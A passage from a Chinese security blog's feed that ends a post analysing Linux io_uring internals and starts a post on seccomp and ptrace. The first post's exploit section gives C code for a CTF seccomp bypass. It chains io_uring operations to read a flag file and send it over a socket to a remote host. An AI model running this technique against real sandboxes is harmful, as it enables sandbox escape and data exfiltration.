class="line"><span class="keyword">if</span> (!(req-&gt;flags &amp; REQ_F_REFCOUNT))</span><br><span class="line">__io_req_set_refcount(req, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">req_ref_get(req);</span><br><span class="line"></span><br><span class="line">io_arm_ltimeout(req);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* either cancelled or io-wq is dying, so don&#x27;t touch tctx-&gt;iowq */</span></span><br><span class="line"><span class="keyword">if</span> (work-&gt;flags &amp; IO_WQ_WORK_CANCEL) &#123;</span><br><span class="line">fail:</span><br><span class="line">io_req_task_queue_fail(req, err);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!io_assign_file(req, def, issue_flags)) &#123;</span><br><span class="line">err = -EBADF;</span><br><span class="line">work-&gt;flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; REQ_F_FORCE_ASYNC) &#123;</span><br><span class="line"><span class="type">bool</span> opcode_poll = def-&gt;pollin || def-&gt;pollout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (opcode_poll &amp;&amp; file_can_poll(req-&gt;file)) &#123;</span><br><span class="line">needs_poll = <span class="literal">true</span>;</span><br><span class="line">issue_flags |= IO_URING_F_NONBLOCK;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">ret = io_issue_sqe(req, issue_flags);</span><br><span class="line"><span class="comment">// 最终还是调用了 io_issue_sqe 来处理任务</span></span><br><span class="line"><span class="keyword">if</span> (ret != -EAGAIN)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If REQ_F_NOWAIT is set, then don&#x27;t wait or retry with</span></span><br><span class="line"><span class="comment"> * poll. -EAGAIN is final for that case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; REQ_F_NOWAIT)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We can get EAGAIN for iopolled IO even though we&#x27;re</span></span><br><span class="line"><span class="comment"> * forcing a sync submission from here, since we can&#x27;t</span></span><br><span class="line"><span class="comment"> * wait for request slots on the block side.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!needs_poll) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(req-&gt;ctx-&gt;flags &amp; IORING_SETUP_IOPOLL))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (io_wq_worker_stopped())</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">cond_resched();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (io_arm_poll_handler(req, issue_flags) == IO_APOLL_OK)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/* aborted or ready, in either case retry blocking */</span></span><br><span class="line">needs_poll = <span class="literal">false</span>;</span><br><span class="line">issue_flags &amp;= ~IO_URING_F_NONBLOCK;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* avoid locking problems by failing it from a clean context */</span></span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">io_req_task_queue_fail(req, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="summary">summary</h2><p>笔者已经从上至下，透视了整个io_uring的实现//</p><p>当然，在这篇文章，笔者还留下了很多问题，比如linux kernel与同步和异步过程相关的实现， 由于笔者太菜了，对于kernel部分代码的分析也稍显吃力。</p><p>不过就这篇文章而言，在用户态io_uring的使用，笔者应该讲述得很清晰了。</p><p>最后，再让我们回到文章开始的问题：</p><p>如何只用一个 <code>io_uring_setup</code> 实现ORW?</p><p>在完全看完整篇文章后，大家应该也有答案了：</p><ul><li>设置 <code>IORING_SETUP_SQPOLL</code>  此时不再需要 <code>io_uring_submite</code> 提交</li><li>设置 <code>IORING_SETUP_NOMMAP</code>  此时不再需要之后mmap ring和sqe</li></ul><h2 id="TODO">TODO</h2><ul><li>ctx 初始化分析</li><li>线程调度分析</li><li>wq队列处理分析</li></ul><h2 id="exp">exp</h2><p>笔者在实际利用时发现, 在笔者的笔记本的qemu的环境里, 似乎是因为只有一个core, 如果控制权转移给了<code>io_sq_thread</code> 线程, 除非其主动转移控制权, 主进程基本会直接阻塞, 因此, open sq的处理实际要在 <code>io_uring_setup</code> 创建返回fd之前, 因此 flag文件的fd为3 才能稳定应用</p><p>通过Socket连接写回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">params</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x10</span>] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">0x10</span>] = <span class="string">&quot;AAAAAAAA\n&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *ring_ptr;</span><br><span class="line">    <span class="type">unsigned</span> *ktail;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        __u64 a1;</span><br><span class="line">        __u64 a2;</span><br><span class="line">    &#125; socket_add = <span class="comment">//&#123;0x0100007f5c110002, 0&#125;;</span></span><br><span class="line">        &#123;<span class="number">0x017aa8c05c110002</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">// mmap(0xC0D3000uLL, 0x3000uLL, 7uLL, 34u, 0xFFFFFFFFuLL, 0LL);</span></span><br><span class="line">    params.sq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x1000</span>;</span><br><span class="line">    ring_ptr = params.cq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x2000</span>;</span><br><span class="line">    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;</span><br><span class="line"></span><br><span class="line">    params.sq_thread_idle = <span class="number">0x2000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span> =</span> (<span class="keyword">struct</span> io_uring_sqe *)(<span class="number">0xC0D3000</span> + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">0</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">1</span>].opcode = IORING_OP_READ;</span><br><span class="line">    sqe[<span class="number">1</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">1</span>].fd = <span class="number">3</span>;</span><br><span class="line">    sqe[<span class="number">1</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">1</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">2</span>].opcode = IORING_OP_SOCKET;</span><br><span class="line">    sqe[<span class="number">2</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">2</span>].fd = <span class="number">2</span>;</span><br><span class="line">    sqe[<span class="number">2</span>].off = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">3</span>].opcode = IORING_OP_CONNECT;</span><br><span class="line">    sqe[<span class="number">3</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">3</span>].fd = <span class="number">5</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].flags = <span class="number">4</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].addr = &amp;socket_add;</span><br><span class="line">    sqe[<span class="number">3</span>].off = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">4</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">    sqe[<span class="number">4</span>].fd = <span class="number">5</span>;</span><br><span class="line">    sqe[<span class="number">4</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">4</span>].len = <span class="number">0x100</span>;</span><br><span class="line">    ktail = ring_ptr + <span class="number">4</span>;</span><br><span class="line">    io_uring_smp_store_release(ktail, <span class="number">5</span>);</span><br><span class="line">    __do_syscall2(<span class="number">425</span>, <span class="number">0x10</span>, &amp;params);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>orw</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">0</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">1</span>].opcode = IORING_OP_READ;</span><br><span class="line">sqe[<span class="number">1</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">1</span>].fd = <span class="number">3</span>;</span><br><span class="line">sqe[<span class="number">1</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">1</span>].len = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sqe[4].flags = IOSQE_IO_HARDLINK;</span></span><br><span class="line"></span><br><span class="line">sqe[<span class="number">2</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">sqe[<span class="number">2</span>].fd = <span class="number">1</span>;</span><br><span class="line">sqe[<span class="number">2</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">2</span>].len = <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure><p>通过大量open避免 open的fd和 <code>io_uring_setup</code> 返回的fd竞争的问题<br>增强利用稳定性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">0</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">1</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">1</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">1</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">1</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">2</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">2</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">2</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">2</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">3</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">3</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">3</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">3</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">4</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">4</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">4</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">4</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">5</span>].opcode = IORING_OP_READ;</span><br><span class="line">sqe[<span class="number">5</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">5</span>].fd = <span class="number">6</span>;</span><br><span class="line">sqe[<span class="number">5</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">5</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">6</span>].opcode = IORING_OP_SOCKET;</span><br><span class="line">sqe[<span class="number">6</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">6</span>].fd = <span class="number">2</span>;</span><br><span class="line">sqe[<span class="number">6</span>].off = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">7</span>].opcode = IORING_OP_CONNECT;</span><br><span class="line">sqe[<span class="number">7</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">7</span>].fd = <span class="number">9</span>;</span><br><span class="line">sqe[<span class="number">7</span>].flags = <span class="number">4</span>;</span><br><span class="line">sqe[<span class="number">7</span>].addr = &amp;socket_add;</span><br><span class="line">sqe[<span class="number">7</span>].off = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">8</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">sqe[<span class="number">8</span>].fd = <span class="number">9</span>;</span><br><span class="line">sqe[<span class="number">8</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">8</span>].len = <span class="number">0x100</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">params</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x10</span>] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">0x10</span>] = <span class="string">&quot;AAAAAAAA\n&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *ring_ptr;</span><br><span class="line">    <span class="type">unsigned</span> *ktail;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        __u64 a1;</span><br><span class="line">        __u64 a2;</span><br><span class="line">    &#125; socket_add = <span class="comment">//&#123;0x0100007f5c110002, 0&#125;;</span></span><br><span class="line">        &#123;<span class="number">0x017aa8c05c110002</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">//mmap(0xC0D3000uLL, 0x3000uLL, 7uLL, 34u, 0xFFFFFFFFuLL, 0LL);</span></span><br><span class="line">    params.sq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x1000</span>;</span><br><span class="line">    ring_ptr = params.cq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x2000</span>;</span><br><span class="line">    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;</span><br><span class="line"></span><br><span class="line">    params.sq_thread_idle = <span class="number">0x2000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span> =</span> (<span class="keyword">struct</span> io_uring_sqe *)(<span class="number">0xC0D3000</span> + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">0</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">1</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">1</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">1</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">1</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">2</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    <span class="comment">//sqe[2].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">2</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">2</span>].addr = flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">3</span>].opcode = IORING_OP_READ;</span><br><span class="line">    <span class="comment">//sqe[3].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">3</span>].fd = <span class="number">4</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">3</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">4</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">    <span class="comment">//sqe[4].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">4</span>].fd = <span class="number">1</span>;</span><br><span class="line">    sqe[<span class="number">4</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">4</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ktail = ring_ptr + <span class="number">4</span>;</span><br><span class="line">    io_uring_smp_store_release(ktail, <span class="number">5</span>);</span><br><span class="line">    __do_syscall2(<span class="number">425</span>, <span class="number">0x10</span>, &amp;params);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在N1线下赛遇见一个seccomp沙箱，限制了只能使用 &lt;code&gt;io_uring_setup&lt;/code&gt; 一个系统调用，之前不久的ACTF中， 使用&lt;code&gt;mmap&lt;/code&gt;、&lt;code&gt;io_uring_setup&lt;/code&gt;、&lt;code&gt;io_uring_enter&lt;/code&gt; 三个系统调用，完成了orw。 如何仅仅使用 &lt;code&gt;io_uring_setup&lt;/code&gt; 完成orw呢？&lt;/p&gt;
&lt;p&gt;本文将不仅仅局限于CTF，而是从io_uring的实现出发，先从宏观角度透视io_uring的实现框架， 然后以源代码为基础，自顶向下，从liburing，到内核io_uring的用户态接口， 最后到io_uring的内核实现，一步步聚焦 &lt;code&gt;io_uring&lt;/code&gt;  具体的实现。&lt;/p&gt;
&lt;p&gt;由于笔者的研究方向的是二进制安全，因此笔者将更多关注 io_uring 中用户和内核态的通信这一容易产生安全漏洞的模块，而不会聚焦io_uring的异步调度和任务处理，以上。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="linux" scheme="https://v3rdant.cn/tags/linux/"/>
    
    <category term="io_uring" scheme="https://v3rdant.cn/tags/io-uring/"/>
    
    <category term="shellcode" scheme="https://v3rdant.cn/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>Linux.Seccomp-and-Ptrace</title>
    <link href="https://v3rdant.cn/Linux.Seccomp-and-Ptrace/"/>
    <id>https://v3rdant.cn/Linux.Seccomp-and-Ptrace/</id>
    <published>2023-10-30T16:00:00.000Z</published>
    <updated>2024-03-04T07:37:44.360Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Background">Background</h2><p>最近ACTF出现了一个限制非常严格的沙箱，校队里一位pwn师傅搜到了一些用ptrace修改子进程rax来绕过seccomp的wp。</p><p>正值校赛，为了出题的事忙得焦头烂额，就没有细想。</p><p>但是由于我记得seccomp 是内核hook，而ptrace， 出于一些对调试器的印象，我觉得他对于attach的子进程的寄存器的更改，<s>是在用户态实现的</s>。 那么ptrace的处理应该在seccomp之前，所以我觉得不太可行。</p><p>在有时间后，我开始探究了一下，确实不太可行，只是原因跟我想象得不太一样…</p><span id="more"></span><h2 id="Intro">Intro</h2><p>在开始之前，先介绍一下三个概念：</p><ul><li>seccome</li><li>prctl</li><li>ptrace</li></ul><p>如果没有提到，以上代码均来自linux-6.6</p><h3 id="prctl-seccomp">prctl / seccomp</h3><p><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">prctl</a> 是linux下一个实现进程操控的系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="type">int</span>, option, <span class="type">unsigned</span> <span class="type">long</span>, arg2, <span class="type">unsigned</span> <span class="type">long</span>, arg3,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>, arg4, <span class="type">unsigned</span> <span class="type">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> =</span> current;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line"><span class="type">long</span> error;</span><br><span class="line"></span><br><span class="line">error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line"><span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">error = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span> (option) &#123;</span><br><span class="line"><span class="keyword">case</span> PR_SET_PDEATHSIG:</span><br><span class="line"><span class="keyword">if</span> (!valid_signal(arg2)) &#123;</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">me-&gt;pdeath_signal = arg2;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">.............</span></span><br><span class="line"><span class="comment">省略若干</span></span><br><span class="line"><span class="comment">.............</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">case</span> PR_GET_SECCOMP:</span><br><span class="line">error = prctl_get_seccomp();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">.............</span></span><br><span class="line"><span class="comment">省略若干</span></span><br><span class="line"><span class="comment">.............</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读源码和man doc， 可以看到prctl主要实现了两类命令，<code>SET</code> 和 <code>GET</code> ， 即操作进程运行时和获取进程信息。</p><p>而seccomp就是基于prctl实现的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PR_SET_SECCOMP:</span><br><span class="line">error = prctl_set_seccomp(arg2, (<span class="type">char</span> __user *)arg3);</span><br></pre></td></tr></table></figure><p>这里涉及到这样一条调用链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--&gt;prctl </span><br><span class="line">--&gt;prctl_set_seccomp</span><br><span class="line">--&gt;do_seccomp</span><br><span class="line">--&gt;seccomp_set_mode_filter</span><br><span class="line">--&gt; seccomp_attach_filter </span><br></pre></td></tr></table></figure><p><code>seccomp_attach_filter</code> 核心代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filter-&gt;prev = current-&gt;seccomp.filter;</span><br><span class="line">seccomp_cache_prepare(filter);</span><br><span class="line">current-&gt;seccomp.filter = filter;</span><br><span class="line"><span 